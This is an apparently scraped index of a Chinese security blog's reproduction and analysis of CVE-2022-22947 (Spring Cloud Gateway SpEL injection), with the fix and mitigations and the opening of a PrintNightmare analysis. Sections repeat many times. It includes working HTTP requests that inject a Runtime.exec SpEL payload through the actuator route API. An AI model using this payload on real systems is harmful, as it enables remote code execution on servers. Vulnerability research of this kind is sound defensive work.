等技术开发的高性能 API 网关组件。 Spring Cloud GateWay 最主要的功能就是路由转发，而在定义转发规则时主要涉及了以下三个核心概念，如下表。 核心概念 描述 Route（路由） 网关最基本的模块。它由一个 ID、一个目标 URI、一组断言（Predicate）和一组过滤器（Filter）组成。 Predicate（断言） 路由转发的判断条件，我们可以通过 Predicate 对 HTTP 请求进行匹配，例如请求方式、请求路径、请求头、参数等，如果请求与断言匹配成功，则将请求转发到相应的服务。 Filter（过滤器） 过滤器，我们可以使用它对请求进行拦截和修改，还可以使用它对响应进行再处理。 Actuator API官方文档： https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#actuator-api 暴露网关通过/gateway这个Actuator可以监控并且和网关进行交互，前提是将该endpoint暴露给Web 通过配置application.properties允许web访问api properties management.endpoint.gateway.enabled=true # default value management.endpoints.web.exposure.include=gateway\r网关允许的操作网关支持的所有操作如下图，我们可以看到其支持通过POST请求添加一个新的route 添加路由官网给出的例子如下，可以创建一个简单的Route 添加过滤器上面的路由中最关键的过滤器为空，官方提过了多种自定义过滤器 https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#the-rewritepath-gatewayfilter-factory 以RewritePath为例: 发送如下两个请求就可以添加一个路由器，并将http://127.0.0.1:9000/red重定向为https://blog.dre4merp.top/ text POST /actuator/gateway/routes/new_route HTTP/1.1 Host: 127.0.0.1:9000 Connection: close Content-Type: application/json Content-Length: 346 { \"predicates\": [ { \"name\": \"Path\", \"args\": { \"_genkey_0\": \"/red/**\" } } ], \"filters\": [ { \"name\": \"RewritePath\", \"args\": { \"_genkey_0\": \"/red/?(?.*)\", \"_genkey_1\": \"/${path}\" } } ], \"uri\": \"http://blog.dre4merp.top\", \"order\": 0 }\rtext POST /actuator/gateway/refresh HTTP/1.1 Host: 127.0.0.1:9000 Connection: close Content-Length: 2\r","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#actuator-api"},{"categories":[],"content":"\rSpring Cloud Gateway\r概念Spring Cloud Gateway 是 Spring Cloud 团队基于 Spring 5.0、Spring Boot 2.0 和 Project Reactor 等技术开发的高性能 API 网关组件。 Spring Cloud GateWay 最主要的功能就是路由转发，而在定义转发规则时主要涉及了以下三个核心概念，如下表。 核心概念 描述 Route（路由） 网关最基本的模块。它由一个 ID、一个目标 URI、一组断言（Predicate）和一组过滤器（Filter）组成。 Predicate（断言） 路由转发的判断条件，我们可以通过 Predicate 对 HTTP 请求进行匹配，例如请求方式、请求路径、请求头、参数等，如果请求与断言匹配成功，则将请求转发到相应的服务。 Filter（过滤器） 过滤器，我们可以使用它对请求进行拦截和修改，还可以使用它对响应进行再处理。 Actuator API官方文档： https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#actuator-api 暴露网关通过/gateway这个Actuator可以监控并且和网关进行交互，前提是将该endpoint暴露给Web 通过配置application.properties允许web访问api properties management.endpoint.gateway.enabled=true # default value management.endpoints.web.exposure.include=gateway\r网关允许的操作网关支持的所有操作如下图，我们可以看到其支持通过POST请求添加一个新的route 添加路由官网给出的例子如下，可以创建一个简单的Route 添加过滤器上面的路由中最关键的过滤器为空，官方提过了多种自定义过滤器 https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#the-rewritepath-gatewayfilter-factory 以RewritePath为例: 发送如下两个请求就可以添加一个路由器，并将http://127.0.0.1:9000/red重定向为https://blog.dre4merp.top/ text POST /actuator/gateway/routes/new_route HTTP/1.1 Host: 127.0.0.1:9000 Connection: close Content-Type: application/json Content-Length: 346 { \"predicates\": [ { \"name\": \"Path\", \"args\": { \"_genkey_0\": \"/red/**\" } } ], \"filters\": [ { \"name\": \"RewritePath\", \"args\": { \"_genkey_0\": \"/red/?(?.*)\", \"_genkey_1\": \"/${path}\" } } ], \"uri\": \"http://blog.dre4merp.top\", \"order\": 0 }\rtext POST /actuator/gateway/refresh HTTP/1.1 Host: 127.0.0.1:9000 Connection: close Content-Length: 2\r","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#暴露网关"},{"categories":[],"content":"\rSpring Cloud Gateway\r概念Spring Cloud Gateway 是 Spring Cloud 团队基于 Spring 5.0、Spring Boot 2.0 和 Project Reactor 等技术开发的高性能 API 网关组件。 Spring Cloud GateWay 最主要的功能就是路由转发，而在定义转发规则时主要涉及了以下三个核心概念，如下表。 核心概念 描述 Route（路由） 网关最基本的模块。它由一个 ID、一个目标 URI、一组断言（Predicate）和一组过滤器（Filter）组成。 Predicate（断言） 路由转发的判断条件，我们可以通过 Predicate 对 HTTP 请求进行匹配，例如请求方式、请求路径、请求头、参数等，如果请求与断言匹配成功，则将请求转发到相应的服务。 Filter（过滤器） 过滤器，我们可以使用它对请求进行拦截和修改，还可以使用它对响应进行再处理。 Actuator API官方文档： https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#actuator-api 暴露网关通过/gateway这个Actuator可以监控并且和网关进行交互，前提是将该endpoint暴露给Web 通过配置application.properties允许web访问api properties management.endpoint.gateway.enabled=true # default value management.endpoints.web.exposure.include=gateway\r网关允许的操作网关支持的所有操作如下图，我们可以看到其支持通过POST请求添加一个新的route 添加路由官网给出的例子如下，可以创建一个简单的Route 添加过滤器上面的路由中最关键的过滤器为空，官方提过了多种自定义过滤器 https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#the-rewritepath-gatewayfilter-factory 以RewritePath为例: 发送如下两个请求就可以添加一个路由器，并将http://127.0.0.1:9000/red重定向为https://blog.dre4merp.top/ text POST /actuator/gateway/routes/new_route HTTP/1.1 Host: 127.0.0.1:9000 Connection: close Content-Type: application/json Content-Length: 346 { \"predicates\": [ { \"name\": \"Path\", \"args\": { \"_genkey_0\": \"/red/**\" } } ], \"filters\": [ { \"name\": \"RewritePath\", \"args\": { \"_genkey_0\": \"/red/?(?.*)\", \"_genkey_1\": \"/${path}\" } } ], \"uri\": \"http://blog.dre4merp.top\", \"order\": 0 }\rtext POST /actuator/gateway/refresh HTTP/1.1 Host: 127.0.0.1:9000 Connection: close Content-Length: 2\r","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#网关允许的操作"},{"categories":[],"content":"\rSpring Cloud Gateway\r概念Spring Cloud Gateway 是 Spring Cloud 团队基于 Spring 5.0、Spring Boot 2.0 和 Project Reactor 等技术开发的高性能 API 网关组件。 Spring Cloud GateWay 最主要的功能就是路由转发，而在定义转发规则时主要涉及了以下三个核心概念，如下表。 核心概念 描述 Route（路由） 网关最基本的模块。它由一个 ID、一个目标 URI、一组断言（Predicate）和一组过滤器（Filter）组成。 Predicate（断言） 路由转发的判断条件，我们可以通过 Predicate 对 HTTP 请求进行匹配，例如请求方式、请求路径、请求头、参数等，如果请求与断言匹配成功，则将请求转发到相应的服务。 Filter（过滤器） 过滤器，我们可以使用它对请求进行拦截和修改，还可以使用它对响应进行再处理。 Actuator API官方文档： https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#actuator-api 暴露网关通过/gateway这个Actuator可以监控并且和网关进行交互，前提是将该endpoint暴露给Web 通过配置application.properties允许web访问api properties management.endpoint.gateway.enabled=true # default value management.endpoints.web.exposure.include=gateway\r网关允许的操作网关支持的所有操作如下图，我们可以看到其支持通过POST请求添加一个新的route 添加路由官网给出的例子如下，可以创建一个简单的Route 添加过滤器上面的路由中最关键的过滤器为空，官方提过了多种自定义过滤器 https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#the-rewritepath-gatewayfilter-factory 以RewritePath为例: 发送如下两个请求就可以添加一个路由器，并将http://127.0.0.1:9000/red重定向为https://blog.dre4merp.top/ text POST /actuator/gateway/routes/new_route HTTP/1.1 Host: 127.0.0.1:9000 Connection: close Content-Type: application/json Content-Length: 346 { \"predicates\": [ { \"name\": \"Path\", \"args\": { \"_genkey_0\": \"/red/**\" } } ], \"filters\": [ { \"name\": \"RewritePath\", \"args\": { \"_genkey_0\": \"/red/?(?.*)\", \"_genkey_1\": \"/${path}\" } } ], \"uri\": \"http://blog.dre4merp.top\", \"order\": 0 }\rtext POST /actuator/gateway/refresh HTTP/1.1 Host: 127.0.0.1:9000 Connection: close Content-Length: 2\r","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#添加路由"},{"categories":[],"content":"\rSpring Cloud Gateway\r概念Spring Cloud Gateway 是 Spring Cloud 团队基于 Spring 5.0、Spring Boot 2.0 和 Project Reactor 等技术开发的高性能 API 网关组件。 Spring Cloud GateWay 最主要的功能就是路由转发，而在定义转发规则时主要涉及了以下三个核心概念，如下表。 核心概念 描述 Route（路由） 网关最基本的模块。它由一个 ID、一个目标 URI、一组断言（Predicate）和一组过滤器（Filter）组成。 Predicate（断言） 路由转发的判断条件，我们可以通过 Predicate 对 HTTP 请求进行匹配，例如请求方式、请求路径、请求头、参数等，如果请求与断言匹配成功，则将请求转发到相应的服务。 Filter（过滤器） 过滤器，我们可以使用它对请求进行拦截和修改，还可以使用它对响应进行再处理。 Actuator API官方文档： https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#actuator-api 暴露网关通过/gateway这个Actuator可以监控并且和网关进行交互，前提是将该endpoint暴露给Web 通过配置application.properties允许web访问api properties management.endpoint.gateway.enabled=true # default value management.endpoints.web.exposure.include=gateway\r网关允许的操作网关支持的所有操作如下图，我们可以看到其支持通过POST请求添加一个新的route 添加路由官网给出的例子如下，可以创建一个简单的Route 添加过滤器上面的路由中最关键的过滤器为空，官方提过了多种自定义过滤器 https://docs.spring.io/spring-cloud-gateway/docs/3.0.4/reference/html/#the-rewritepath-gatewayfilter-factory 以RewritePath为例: 发送如下两个请求就可以添加一个路由器，并将http://127.0.0.1:9000/red重定向为https://blog.dre4merp.top/ text POST /actuator/gateway/routes/new_route HTTP/1.1 Host: 127.0.0.1:9000 Connection: close Content-Type: application/json Content-Length: 346 { \"predicates\": [ { \"name\": \"Path\", \"args\": { \"_genkey_0\": \"/red/**\" } } ], \"filters\": [ { \"name\": \"RewritePath\", \"args\": { \"_genkey_0\": \"/red/?(?.*)\", \"_genkey_1\": \"/${path}\" } } ], \"uri\": \"http://blog.dre4merp.top\", \"order\": 0 }\rtext POST /actuator/gateway/refresh HTTP/1.1 Host: 127.0.0.1:9000 Connection: close Content-Length: 2\r","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#添加过滤器"},{"categories":[],"content":"\rSpEL表达式Spring表达式语言（简称 SpEL，全称Spring Expression Language）是一种功能强大的表达式语言，支持在运行时查询和操作对象图。它语法类似于OGNL，MVEL和JBoss EL，在方法调用和基本的字符串模板提供了极大地便利，也开发减轻了Java代码量。另外 , SpEL是Spring产品组合中表达评估的基础，但它并不直接与Spring绑定,可以独立使用。 ","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:3","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#spel表达式"},{"categories":[],"content":"\r漏洞分析","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:0","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞分析"},{"categories":[],"content":"\r漏洞点分析查看类的继承关系，发现所有的内置filterFactory都实现了ShortcutConfigurable接口，所以添加的过滤器都会经过ShortcutConfigurable 漏洞点就位于org.springframework.cloud.gateway.support.ShortcutConfigurable#getValue中，查看源码发现filter的参数支持SpEL表达式，而且是通过StandardEvaluationContext使用表达式，完美满足了SpEL表达式注入的条件。 java static Object getValue(SpelExpressionParser parser, BeanFactory beanFactory, String entryValue) { Object value; String rawValue = entryValue; if (rawValue != null) { rawValue = rawValue.trim(); } if (rawValue != null \u0026\u0026 rawValue.startsWith(\"#{\") \u0026\u0026 entryValue.endsWith(\"}\")) { // assume it's spel StandardEvaluationContext context = new StandardEvaluationContext(); context.setBeanResolver(new BeanFactoryResolver(beanFactory)); Expression expression = parser.parseExpression(entryValue, new TemplateParserContext()); value = expression.getValue(context); } else { value = entryValue; } return value; }\r","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:1","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞点分析"},{"categories":[],"content":"\r漏洞利用\r创建路由\rtext POST /actuator/gateway/routes/hacktest HTTP/1.1 Host: 127.0.0.1:9000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: close Accept-Language: en Content-Type: application/json Content-Length: 340 { \"id\": \"hacktest\", \"filters\": [{ \"name\": \"AddResponseHeader\", \"args\": {\"name\": \"Result\",\"value\": \"#{new java.lang.Strin(T(org.springframework.util.StreamUtils).copyToByteArray((java.lang.Runtime).getRuntime().exec(new String[{\\\"calc\\\"}).getInputStream()))}\"} }], \"uri\": \"https://blog.dre4merp.top\", \"order\": 0 }\r刷新路由\rtext POST /actuator/gateway/refresh HTTP/1.1 Host: 127.0.0.1:9000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 0\r","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:2","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞利用"},{"categories":[],"content":"\r漏洞利用\r创建路由\rtext POST /actuator/gateway/routes/hacktest HTTP/1.1 Host: 127.0.0.1:9000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: close Accept-Language: en Content-Type: application/json Content-Length: 340 { \"id\": \"hacktest\", \"filters\": [{ \"name\": \"AddResponseHeader\", \"args\": {\"name\": \"Result\",\"value\": \"#{new java.lang.Strin(T(org.springframework.util.StreamUtils).copyToByteArray((java.lang.Runtime).getRuntime().exec(new String[{\\\"calc\\\"}).getInputStream()))}\"} }], \"uri\": \"https://blog.dre4merp.top\", \"order\": 0 }\r刷新路由\rtext POST /actuator/gateway/refresh HTTP/1.1 Host: 127.0.0.1:9000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 0\r","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:2","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#创建路由"},{"categories":[],"content":"\r漏洞利用\r创建路由\rtext POST /actuator/gateway/routes/hacktest HTTP/1.1 Host: 127.0.0.1:9000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: close Accept-Language: en Content-Type: application/json Content-Length: 340 { \"id\": \"hacktest\", \"filters\": [{ \"name\": \"AddResponseHeader\", \"args\": {\"name\": \"Result\",\"value\": \"#{new java.lang.Strin(T(org.springframework.util.StreamUtils).copyToByteArray((java.lang.Runtime).getRuntime().exec(new String[{\\\"calc\\\"}).getInputStream()))}\"} }], \"uri\": \"https://blog.dre4merp.top\", \"order\": 0 }\r刷新路由\rtext POST /actuator/gateway/refresh HTTP/1.1 Host: 127.0.0.1:9000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 0\r","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:2","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#刷新路由"},{"categories":[],"content":"\r漏洞防护\r官方修复官方已经发布了针对CVE-2022-22947的补丁 具体方案如下： 在 ShortcutConfigurable 接口中的 getValue 方法中，使用自定义的 GatewayEvaluationContext 类替换了原来的 StandardEvaluationContext 类。查看 GatewayEvaluationContext 类的实现可知，其是对 SimpleEvaluationContext 类的简单封装。 通过查询文档可知，StandardEvaluationContext 和 SimpleEvaluationContext 都类是执行 Spring 的 SpEL 表达式的接口，区别在于前者支持 SpEL 表达式的全部特性，后者相当于一个沙盒，限制了很多功能，如对 Java 类的引用等。因此通过将 StandardEvaluationContext 类替换为 GatewayEvaluationContext 类，可以限制执行注入的 SpEL 表达式。 临时修补\r禁用 actuator gateway通过前面的漏洞利用过程可以看到，首先需要通过 /actuator/gateway/routes/{id} API 创建一条路由。因此将此 API 禁止，也可实现漏洞的修复。根据 Actuator 的 API 文档可知，启用 actuator gateway 需要设置以下两个配置的值： text management.endpoint.gateway.enabled=true # default value management.endpoints.web.exposure.include=gateway\r因此只要这两个选项不同时满足，就不会启用 actuator gateway。 HotPatch通过Agent技术将内存中的ShortcutConfigurable#getValue修改为使用GatewayEvaluationContext调用SpEL表达式。 ","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:3","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞防护"},{"categories":[],"content":"\r漏洞防护\r官方修复官方已经发布了针对CVE-2022-22947的补丁 具体方案如下： 在 ShortcutConfigurable 接口中的 getValue 方法中，使用自定义的 GatewayEvaluationContext 类替换了原来的 StandardEvaluationContext 类。查看 GatewayEvaluationContext 类的实现可知，其是对 SimpleEvaluationContext 类的简单封装。 通过查询文档可知，StandardEvaluationContext 和 SimpleEvaluationContext 都类是执行 Spring 的 SpEL 表达式的接口，区别在于前者支持 SpEL 表达式的全部特性，后者相当于一个沙盒，限制了很多功能，如对 Java 类的引用等。因此通过将 StandardEvaluationContext 类替换为 GatewayEvaluationContext 类，可以限制执行注入的 SpEL 表达式。 临时修补\r禁用 actuator gateway通过前面的漏洞利用过程可以看到，首先需要通过 /actuator/gateway/routes/{id} API 创建一条路由。因此将此 API 禁止，也可实现漏洞的修复。根据 Actuator 的 API 文档可知，启用 actuator gateway 需要设置以下两个配置的值： text management.endpoint.gateway.enabled=true # default value management.endpoints.web.exposure.include=gateway\r因此只要这两个选项不同时满足，就不会启用 actuator gateway。 HotPatch通过Agent技术将内存中的ShortcutConfigurable#getValue修改为使用GatewayEvaluationContext调用SpEL表达式。 ","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:3","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#官方修复"},{"categories":[],"content":"\r漏洞防护\r官方修复官方已经发布了针对CVE-2022-22947的补丁 具体方案如下： 在 ShortcutConfigurable 接口中的 getValue 方法中，使用自定义的 GatewayEvaluationContext 类替换了原来的 StandardEvaluationContext 类。查看 GatewayEvaluationContext 类的实现可知，其是对 SimpleEvaluationContext 类的简单封装。 通过查询文档可知，StandardEvaluationContext 和 SimpleEvaluationContext 都类是执行 Spring 的 SpEL 表达式的接口，区别在于前者支持 SpEL 表达式的全部特性，后者相当于一个沙盒，限制了很多功能，如对 Java 类的引用等。因此通过将 StandardEvaluationContext 类替换为 GatewayEvaluationContext 类，可以限制执行注入的 SpEL 表达式。 临时修补\r禁用 actuator gateway通过前面的漏洞利用过程可以看到，首先需要通过 /actuator/gateway/routes/{id} API 创建一条路由。因此将此 API 禁止，也可实现漏洞的修复。根据 Actuator 的 API 文档可知，启用 actuator gateway 需要设置以下两个配置的值： text management.endpoint.gateway.enabled=true # default value management.endpoints.web.exposure.include=gateway\r因此只要这两个选项不同时满足，就不会启用 actuator gateway。 HotPatch通过Agent技术将内存中的ShortcutConfigurable#getValue修改为使用GatewayEvaluationContext调用SpEL表达式。 ","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:3","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#临时修补"},{"categories":[],"content":"\r漏洞防护\r官方修复官方已经发布了针对CVE-2022-22947的补丁 具体方案如下： 在 ShortcutConfigurable 接口中的 getValue 方法中，使用自定义的 GatewayEvaluationContext 类替换了原来的 StandardEvaluationContext 类。查看 GatewayEvaluationContext 类的实现可知，其是对 SimpleEvaluationContext 类的简单封装。 通过查询文档可知，StandardEvaluationContext 和 SimpleEvaluationContext 都类是执行 Spring 的 SpEL 表达式的接口，区别在于前者支持 SpEL 表达式的全部特性，后者相当于一个沙盒，限制了很多功能，如对 Java 类的引用等。因此通过将 StandardEvaluationContext 类替换为 GatewayEvaluationContext 类，可以限制执行注入的 SpEL 表达式。 临时修补\r禁用 actuator gateway通过前面的漏洞利用过程可以看到，首先需要通过 /actuator/gateway/routes/{id} API 创建一条路由。因此将此 API 禁止，也可实现漏洞的修复。根据 Actuator 的 API 文档可知，启用 actuator gateway 需要设置以下两个配置的值： text management.endpoint.gateway.enabled=true # default value management.endpoints.web.exposure.include=gateway\r因此只要这两个选项不同时满足，就不会启用 actuator gateway。 HotPatch通过Agent技术将内存中的ShortcutConfigurable#getValue修改为使用GatewayEvaluationContext调用SpEL表达式。 ","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:3","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#禁用-actuator-gateway"},{"categories":[],"content":"\r漏洞防护\r官方修复官方已经发布了针对CVE-2022-22947的补丁 具体方案如下： 在 ShortcutConfigurable 接口中的 getValue 方法中，使用自定义的 GatewayEvaluationContext 类替换了原来的 StandardEvaluationContext 类。查看 GatewayEvaluationContext 类的实现可知，其是对 SimpleEvaluationContext 类的简单封装。 通过查询文档可知，StandardEvaluationContext 和 SimpleEvaluationContext 都类是执行 Spring 的 SpEL 表达式的接口，区别在于前者支持 SpEL 表达式的全部特性，后者相当于一个沙盒，限制了很多功能，如对 Java 类的引用等。因此通过将 StandardEvaluationContext 类替换为 GatewayEvaluationContext 类，可以限制执行注入的 SpEL 表达式。 临时修补\r禁用 actuator gateway通过前面的漏洞利用过程可以看到，首先需要通过 /actuator/gateway/routes/{id} API 创建一条路由。因此将此 API 禁止，也可实现漏洞的修复。根据 Actuator 的 API 文档可知，启用 actuator gateway 需要设置以下两个配置的值： text management.endpoint.gateway.enabled=true # default value management.endpoints.web.exposure.include=gateway\r因此只要这两个选项不同时满足，就不会启用 actuator gateway。 HotPatch通过Agent技术将内存中的ShortcutConfigurable#getValue修改为使用GatewayEvaluationContext调用SpEL表达式。 ","date":"2022-04-07","objectID":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:3","series":[],"tags":[],"title":"CVE-2022-22947 漏洞复现及分析","uri":"/2022/04/cve-2022-22947-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#hotpatch"},{"categories":[],"content":"\r漏洞简介前段时间，微软公布了名为Windows PrintNightmare的安全漏洞，获得编号CVE-2021-34527。其与漏洞CVE-2021-1675极其相似，都是通过加载DLL的方式实现代码执行。未经身份验证的远程攻击者可利用该漏洞以SYSTEM权限在域控制器上执行任意代码，从而获得整个域的控制权。微软对于该漏洞的修补工作并没有一步到位，在第一次漏洞爆出并发布修补程序后，仍可以通过其他方式绕过补丁继续利用该漏洞，微软不得不二次进行修补才成功杜绝该漏洞所带来的安全问题。 影响范围：Windows Server 2008-Windows Server 2019 ","date":"2021-12-31","objectID":"/2021/12/printnightmare-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:1:0","series":[],"tags":[],"title":"PrintNightmare 漏洞复现及分析","uri":"/2021/12/printnightmare-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞简介"},{"categories":[],"content":"\r漏洞分析","date":"2021-12-31","objectID":"/2021/12/printnightmare-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:0","series":[],"tags":[],"title":"PrintNightmare 漏洞复现及分析","uri":"/2021/12/printnightmare-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞分析"},{"categories":[],"content":"\r漏洞点分析CVE-2021-1675的漏洞点位于RpcAddPrinterDriverEx中,CVE-2021-34527的漏洞点位于RpcAsyncAddPrinterDriver中。系统在对上述两个函数进行相关处理后，都调用了YAddPrinterDriverEx函数，但是这个过程并没有对参数dwFileCopyFlags进行条件判断，所以可以添加一个标志APD_INSTALL_WARNED_DRIVER，使得添加打印机驱动时，以system权限加载恶意DLL。 Mimikatz中针对PrintNightmare攻击的实现代码 两个漏洞分别的漏洞点 ","date":"2021-12-31","objectID":"/2021/12/printnightmare-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:1","series":[],"tags":[],"title":"PrintNightmare 